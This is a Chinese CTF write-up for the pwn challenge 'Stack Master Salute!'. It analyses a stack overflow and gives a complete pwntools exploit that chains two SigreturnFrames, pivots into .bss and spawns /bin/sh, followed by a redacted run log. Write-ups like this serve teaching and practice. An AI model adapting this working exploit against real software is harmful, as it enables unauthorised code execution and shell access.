---
title: "Stack Master Salute!"
published: 2026-10-24
description: "构造 SigreturnFrame，分阶段写入并迁移到 BSS 完成 SROP。"
tags: ["CTF", "Mini 2025", "Pwn", "SROP"]
category: "CTF Writeup"
draft: false
lang: "zh_CN"
---

> 本文整理自 Mini 2025 WP 笔记。Flag 与服务器地址、连接端口已脱敏；远程连接代码中的占位符需替换后使用。

> Do you know SROP?

## 漏洞分析
我们依旧IDA起手
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(a1: argc, a2: argv, a3: envp);
  vuln();
  return 0;
}
```
```c
signed __int64 vuln()
{
  __int64 savedregs; // [rsp+0h] [rbp+0h] BYREF
  return sys_read(0, (char *)&savedregs, 0x200u);
}
```

一个明显的栈溢出，所以我们用ROPgadget看一下有没有我们可以利用的gadget
```zsh
❯ ROPgadget --binary ./vuln | grep "ret"
0x00000000004010ab : add bh, bh ; loopne 0x401115 ; nop ; ret
0x000000000040118b : add bl, al ; nop ; pop rbp ; ret
0x0000000000401189 : add byte ptr [rax], al ; add bl, al ; nop ; pop rbp ; ret
0x000000000040107c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x00000000004011d3 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040111a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040107e : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004011d5 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040118a : add byte ptr [rax], al ; ret
0x000000000040111b : add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004011ad : add byte ptr [rdi], cl ; add eax, 0x90c3c9c3 ; pop rbp ; ret
0x00000000004010aa : add dil, dil ; loopne 0x401115 ; nop ; ret
0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401117 : add eax, 0x2f4b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011af : add eax, 0x90c3c9c3 ; pop rbp ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401083 : cli ; ret
0x00000000004011df : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401080 : endbr64 ; ret
0x0000000000401184 : in eax, 0x48 ; mov eax, 0xf ; ret
0x00000000004011b1 : leave ; ret
0x00000000004010ad : loopne 0x401115 ; nop ; ret
0x0000000000401116 : mov byte ptr [rip + 0x2f4b], 1 ; pop rbp ; ret
0x00000000004011d2 : mov eax, 0 ; pop rbp ; ret
0x0000000000401186 : mov eax, 0xf ; ret
0x0000000000401183 : mov ebp, esp ; mov rax, 0xf ; ret
0x0000000000401185 : mov rax, 0xf ; ret
0x000000000040117a : nop ; pop rbp ; ret
0x00000000004010af : nop ; ret
0x000000000040111d : pop rbp ; ret
0x000000000040101a : ret
0x0000000000401187 : ror byte ptr [rdi], 0 ; add byte ptr [rax], al ; ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000401188 : sldt word ptr [rax] ; add bl, al ; nop ; pop rbp ; ret
0x00000000004011e1 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004011e0 : sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004010a8 : xor byte ptr [rax + 0x40], al ; add bh, bh ; loopne 0x401115 ; nop ; ret
```

这道题倒是和以往不一样，没有明确的和之前差不多的gadget可以利用，不过题目说了SROP，并且我们找到了`0x0000000000401185 : mov rax, 0xf ; ret`这一句，是将rax修改成15，而15恰好在syscall中对应的是rt_sigreturn，这就是我们所需要利用的SROP漏洞，S代表SigReturn。

SigReturn是AMD64 Linux下系统用来解决程序接收进程信号后处理信号后要返回原先执行的位置和状态的需求的工具，它非常有用，如果我们直接执行这个函数，就能伪造一个假的SigreturnFrame，让rt_sigreturn读取，能够控制很多寄存器状态。我们把它放到栈内，就能让函数读取它。

因此，我们可以设置rax为59，也就是execve，并将RIP修改到syscall上，但是我们还缺少sh的地址得想办法获取一块能稳定写入存放的地址，我们可以直接利用.bss，通常来说.bss是ELF 程序中用来存放未初始化或零初始化的全局变量、静态变量的区域，因此它比较稳定。

这样我们的流程就很清晰了，第一次构造payload覆盖返回地址执行rt_sigreturn的gadget, 加上syscall的gadget，并构造能写入和迁移到.bss的Sigreturn Frame，也就是执行read，目标地址是.bss，然后在第二次payload构造同样的两个gadget, 不过后面替换成execve的SigReturn Frame和binsh的地址。

## exp
```python
from pwn import *

context.binary = elf = ELF("./vuln")
context.arch = "amd64"
context.log_level = "info"

libc = ELF("./libc.so.6")
ld = "./ld-linux-x86-64.so.2"

gadget = 0x401185  # mov rax, 0xf ; ret
syscall = 0x4011ae

bss = elf.bss()      # 0x404040
stage2 = bss + 0xc0  # 0x404100

# 使用题目提供的 ld 和 libc
p = process([
    ld,
    "--library-path", ".",
    "./vuln"
])

frame1 = SigreturnFrame()
frame1.rax = 0
frame1.rdi = 0
frame1.rsi = stage2
frame1.rdx = 0x200
frame1.rip = syscall
frame1.rsp = stage2

payload1 = p64(gadget) + p64(syscall) + bytes(frame1)
print("payload1 长度", len(payload1), "stage2 在", hex(stage2))

p.send(payload1)
sleep(0.5)

frame2 = SigreturnFrame()
frame2.rax = 59
frame2.rdi = stage2 + 0x10 + len(bytes(frame2))
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall
frame2.rsp = stage2 + 0x10 + len(bytes(frame2))

payload2 = p64(gadget) + p64(syscall) + bytes(frame2) + b"/bin/sh\x00"
print("payload2 长度", len(payload2))

p.send(payload2)
sleep(0.5)

p.interactive()
```
为了防止两次payload发送太快，中间sleep了一下

远端只需要把上面那段 `process` 换成 `remote`，其它一个字都不用改
```python
p = remote("HOST_REDACTED", 0)
```
```zsh
❯ python -u "/home/copper0so4/Downloads/attachment/exp.py"
[+] Opening connection to HOST_REDACTED on port PORT_REDACTED: Done
payload1 长度 264 stage2 在 0x404100
payload2 长度 272
[*] Switching to interactive mode
$ cat flag
[FLAG REDACTED]
```

拿到 flag 为 `[FLAG REDACTED]`
